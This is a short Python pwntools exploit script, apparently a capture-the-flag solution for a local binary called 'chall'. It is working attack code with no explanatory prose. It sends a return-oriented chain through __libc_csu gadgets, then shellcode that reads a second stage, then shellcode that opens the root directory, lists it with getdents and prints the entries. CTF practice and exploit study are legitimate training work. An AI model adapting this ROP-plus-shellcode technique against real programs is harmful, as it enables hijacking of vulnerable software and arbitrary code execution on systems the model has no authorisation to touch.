#!/usr/bin/python3
from pwn import *

local = 0
elf = context.binary = ELF('./chall',checksec=False)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "warning"
p = process(elf.path)
if local:
    cmd = ""
    gdb.attach(p, gdbscript=cmd)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

# some variables
ret = 0x00000000004013b4
mov_csu = 0x0000000000401390
pop_csu = 0x00000000004013aa
off = 40
more_read = b"\x90" * 32 + asm("""
    mov rdx, 0x200
    xor rax, rax
    syscall
        """)

pay = p64(ret)*6
pay += p64(pop_csu)
pay += more_read.ljust(48, b"\x90")
p.sendline(pay)

pay = b"\x90" * 100
pay += asm("""
    sub rsp,0x2000
    push 0x2f
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    push 0x2
    pop rax
    syscall

    mov rdi,rax
    mov rsi,rsp
    xor edx,edx
    mov dh, 0x4000 >> 8
    push 0x4e
    pop rax
    syscall

    push 1
    pop rdi
    xor edx,edx
    mov dh, 0x400 >> 8
    mov rsi, rsp
    push 1
    pop rax
    syscall
""")

p.sendline(pay)

p.interactive()
